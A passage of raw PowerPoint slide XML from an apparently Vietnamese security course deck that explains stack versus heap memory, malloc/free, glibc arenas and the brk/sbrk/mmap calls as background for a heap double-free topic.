            <a:ext cx="4572000"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STACK OVERFLOW</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5577840"/>
            <a:ext cx="4572000" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chương trình dùng nhiều stack hơn mức OS cấp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5623560" y="1417320"/>
            <a:ext cx="6108192" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5806440" y="1581912"/>
            <a:ext cx="574243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ĐẶC ĐIỂM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5806440" y="1874520"/>
            <a:ext cx="5742432" cy="4233672"/>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bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lưu biến local, tham số hàm và thông tin lời gọi hàm như return address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Theo LIFO: gọi hàm thì push một stack frame, hàm trả về thì pop frame đó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dữ liệu chỉ sống khi hàm chạy; hàm trả về thì stack pointer quay về vị trí cũ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không phải tự giải phóng như heap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Con trỏ là biến lưu địa chỉ; trả về con trỏ tới biến local là sai vì nó hết hợp lệ khi hàm kết thúc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kích thước do OS quy định: 8 MB trên Linux, đổi bằng </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ulimit -s</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; mỗi thread một stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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Heap: vùng nhớ cho cấp phát động</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1.2 · HEAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="4023360" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="/home/nhanlaptop/UIT/NT521/Heap-Double-Free-Attack/image-3.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1800007"/>
            <a:ext cx="3749040" cy="4035226"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="1417320"/>
            <a:ext cx="7022592" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="1581912"/>
            <a:ext cx="6656832"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Vùng nhớ lớn dùng cho cấp phát động</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="2039112"/>
            <a:ext cx="6656832" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chứa dữ liệu mà kích thước hoặc thời điểm xuất hiện chỉ được biết khi chương trình chạy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="3017520"/>
            <a:ext cx="3396996" cy="1485900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4923"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="3182112"/>
            <a:ext cx="303123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API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="3474720"/>
            <a:ext cx="3031236" cy="32004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malloc() / free()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="3840480"/>
            <a:ext cx="3031236" cy="55321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C/C++ cấp phát và giải phóng thủ công</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8334756" y="3017520"/>
            <a:ext cx="3396996" cy="1485900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4923"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8517636" y="3182112"/>
            <a:ext cx="303123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VÒNG ĐỜI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8517636" y="3474720"/>
            <a:ext cx="3031236" cy="32004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Lập trình viên quyết định</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8517636" y="3840480"/>
            <a:ext cx="3031236" cy="55321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Trừ ngôn ngữ có garbage collector</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="4732020"/>
            <a:ext cx="3396996" cy="1485900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4923"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="4896612"/>
            <a:ext cx="303123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KÍCH THƯỚC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="5189220"/>
            <a:ext cx="3031236" cy="32004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Lớn hơn stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="5554980"/>
            <a:ext cx="3031236" cy="55321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Object, mảng, danh sách liên kết, dữ liệu sống lâu hơn một lời gọi hàm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8334756" y="4732020"/>
            <a:ext cx="3396996" cy="1485900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4923"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8517636" y="4896612"/>
            <a:ext cx="303123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ĐA LUỒNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8517636" y="5189220"/>
            <a:ext cx="3031236" cy="32004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Heap dùng chung</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8517636" y="5554980"/>
            <a:ext cx="3031236" cy="55321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Mỗi thread có stack riêng; glibc có thể cấp arena phụ để giảm tranh chấp khóa</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640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Arenas</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 1 · main_arena, non-main arena và cách glibc quản lý heap theo từng thread</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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2    Ranh giới OS vs glibc</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2.1  struct malloc_state</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2.2  main vs non-main</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2.3  _int_new_arena()</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2.4  Thread chọn arena</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2.5 2.7  bit A, linked list</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Ranh giới: OS cấp vùng nhớ, glibc tự quản lý arena</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KHÁI NIỆM · MỤC 2 · OS KHÔNG BIẾT GÌ VỀ "ARENA"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="3749040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1951"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="158191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OS / KERNEL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="5157216" cy="50292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Chỉ cấp VÙNG địa chỉ ảo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2423160"/>
            <a:ext cx="5157216" cy="2633472"/>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accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>brk()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>sbrk()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: mở rộng heap liền mạch, nối tiếp data segment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mmap()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: cấp một vùng lớn, riêng, ở địa chỉ khác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OS không biết gì về </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
